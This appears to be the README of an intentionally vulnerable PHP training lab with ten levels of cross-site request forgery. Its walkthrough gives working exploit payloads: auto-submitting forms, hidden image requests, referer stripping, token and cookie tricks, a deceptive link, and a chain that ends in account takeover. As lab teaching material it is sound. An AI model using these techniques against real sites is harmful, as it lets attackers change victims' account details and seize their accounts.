# 🛡️ CSRF Masterclass Suite (10 Levels)

> **⚠️ WARNING: EDUCATIONAL PURPOSES ONLY**
> This repository contains intentionally vulnerable code designed for security training and educational purposes. **DO NOT** deploy this code in a production environment. Hosting this environment on a public-facing server without strict isolation (e.g., containerization, network segmentation) is dangerous and can lead to server compromise.

---

[![Security Level: Educational](https://img.shields.io/badge/Security_Level-Educational-blue.svg)]()
[![PHP](https://img.shields.io/badge/Language-PHP-777bb4.svg)]()

Welcome to the **CSRF Masterclass Lab Suite**. This comprehensive, self-contained training arena contains 10 levels of increasing complexity, taking you from fundamental parameter manipulation to advanced referer and token whitelists, SameSite cookie bypasses, and high-impact account takeover chaining.

---

## 🎯 Lab Overview

| Level | Name | Primary Vulnerability |
| :--- | :--- | :--- |
| 🟢 | **Level 1** | GET Method State Change |
| 🟢 | **Level 2** | POST Method State Change (No Tokens) |
| 🟡 | **Level 3** | Weak Referer Validation Bypass |
| 🟡 | **Level 4** | Token Omission Logic Flaw |
| 🔴 | **Level 5** | Detached Session Token |
| 🔴 | **Level 6** | Double Submit Cookie Flaw |
| 🔴 | **Level 7** | JSON Payload CSRF (Weak Content-Type Check) |
| 🔴 | **Level 8** | SameSite Lax loose-method Bypass |
| 🔴 | **Level 9** | SameSite Bypass via Open Redirect Chaining |
| 🟣 | **Level 10** | CSRF to Full Account Takeover |

---

## 🚀 Quick Start

Ensure you have [PHP](https://www.php.net/) installed on your system.

```bash
# 1. Clone the repository (or copy the files)
git clone https://github.com/YOUR_USERNAME/csrf-lab.git
cd csrf-lab

# 2. Start the local server
# (You can use any available port)
php -S localhost:8080
```

👉 **Access the lab at:** `http://localhost:8080`

> 💡 **IMPORTANT NOTE ON EXPLOIT PAYLOADS:**
> The walkthrough payloads in this guide are written assuming the lab is running at `http://localhost:8080/csrf-lab/`.
> If you start your PHP server directly **inside** the `csrf-lab` folder (using `php -S localhost:8080` inside the folder), your root URL is simply `http://localhost:8080/`. 
> In that case, **remember to remove `/csrf-lab` from all exploit URLs** (e.g., use `http://localhost:8080/level1.php` instead of `http://localhost:8080/csrf-lab/level1.php`). Also, adjust the port number (`8080`, `8000`, etc.) in your payloads to match whatever port your local PHP server is running on.

---

## 📓 Lab Walkthrough & Solutions

### 🟢 LEVEL 1: GET Method State Change
*   **Vulnerability:** The server accepts standard GET requests for state-changing email updates.
*   **Exploit Payload:**
    ```html
    <img src="http://localhost:8080/csrf-lab/level1.php?action=update_email&email=attacker@evil.local" style="display:none;">
    ```
*   **Why it works:** The browser attempts to load the image, automatically attaching the victim's session cookies, instantly updating their email address on load.

---

### 🟢 LEVEL 2: POST Method State Change
*   **Vulnerability:** Endpoint correctly requires POST, but completely lacks anti-CSRF token verification.
*   **Exploit Payload:**
    ```html
    <form action="http://localhost:8080/csrf-lab/level2.php" method="POST" id="csrfForm">
        <input type="hidden" name="action" value="update_email">
        <input type="hidden" name="email" value="attacker@evil.local">
    </form>
    <script>document.getElementById('csrfForm').submit();</script>
    ```
*   **Why it works:** Attacker hosts this form on a malicious domain. When the victim loads the page, JavaScript automatically submits the form, transmitting Alice's session cookie and altering her email.

---

### 🟡 LEVEL 3: Weak Referer Validation
*   **Vulnerability:** The server checks that the Referer contains the hostname, but relies on a loose `strpos` check and permits empty Referer headers.
*   **Exploit 1 (Path Injection):**
    Host your exploit on `http://attacker.com/localhost:8080/exploit.html`. The browser's Referer header will contain `localhost:8080`, passing the check!
*   **Exploit 2 (Referer Stripping):**
    Add this meta tag to your attacker exploit to strip the Referer header entirely:
    ```html
    <meta name="referrer" content="no-referrer">
    ```

---

### 🟡 LEVEL 4: Token Omission Logic Flaw
*   **Vulnerability:** The token is validated only if the `csrf_token` parameter is supplied in the request.
*   **Exploit Payload:**
    Submit the standard POST-based CSRF form from Level 2, but completely **omit** the `<input name="csrf_token">` element from the payload.
*   **Why it works:** Since `csrf_token` is missing, the backend bypasses the validation loop entirely and proceeds with the state change.

---

### 🔴 LEVEL 5: Detached Session Token
*   **Vulnerability:** The server validates that the supplied token is active, but fails to check if it belongs to Alice's active session.
*   **Exploit Payload:**
    1. Log into your own account (Bob) and grab your valid token: `bob_secure_token_9f31c2`.
    2. Construct a CSRF form targeted at Alice, but hardcode Bob's token:
       ```html
       <input type="hidden" name="csrf_token" value="bob_secure_token_9f31c2">
       ```
*   **Why it works:** The backend verifies that the token is valid (which it is), and updates Alice's session!

---

### 🔴 LEVEL 6: Double Submit Cookie Flaw
*   **Vulnerability:** Stateless token matching checks if form parameter equals cookie value, but lacks session validation.
*   **Exploit Walkthrough:**
    1. Force set the victim's cookie to a known value by running this in their browser console:
       ```javascript
       document.cookie="csrf_cookie=attacker_forced_cookie; path=/";
       ```
    2. Submit a CSRF form with the matching token parameter:
       ```html
       <input type="hidden" name="csrf_token" value="attacker_forced_cookie">
       ```

---

### 🔴 LEVEL 7: JSON Payload CSRF
*   **Vulnerability:** Server decodes raw JSON bodies but fails to strictly validate the `Content-Type` header.
*   **Exploit Payload:**
    Submit a form with `enctype="text/plain"` to bypass CORS preflight:
    ```html
    <form action="http://localhost:8080/csrf-lab/level7.php" method="POST" enctype="text/plain" id="csrfForm">
        <input name='{"action":"update_email","email":"attacker@evil.local","dummy":"' value='test"}' type="hidden">
    </form>
    <script>document.getElementById('csrfForm').submit();</script>
    ```

---

### 🔴 LEVEL 8: SameSite Lax loose-method Bypass
*   **Vulnerability:** Cookies use `SameSite=Lax` (which restricts third-party POSTs), but the backend loosely accepts GET parameters via `$_REQUEST`.
*   **Exploit Payload:**
    Trigger the state change via a standard top-level GET navigation:
    ```html
    <a href="http://localhost:8080/csrf-lab/level8.php?action=transfer&to=attacker@evil.local&amount=250">
        Click to see a funny cat video!
    </a>
    ```

---

### 🔴 LEVEL 9: SameSite Bypass via Open Redirect
*   **Vulnerability:** Strict Referer checks prevent third-party forms, but the domain hosts an Open Redirect vulnerability.
*   **Exploit Walkthrough:**
    If the target site has an Open Redirect, direct the redirector back to `level9.php` with the parameters. Because the browser navigates from the local redirector page, the Referer header points to `localhost:8080` (valid!).

---

### 🟣 LEVEL 10: CSRF to Full Account Takeover (Final Boss)
*   **Vulnerability:** Vulnerable profile form updates email. Recovery utility sends reset links to the current session email.
*   **Exploit Walkthrough:**
    1. Trigger a CSRF form to update Alice's email to `attacker@evil.local`.
    2. Automatically submit a secondary request to the recovery endpoint (`action=request_reset`).
    3. The system sends the recovery keys directly to the attacker's email, fully compromising Alice's account!

---

## 🛡️ Security Policy & Disclaimer
Please see [SECURITY.md](SECURITY.md) for licensing and ethical usage instructions.

---
*Created with ❤️ by **Zoly** for Bug Bounty Mastery.*
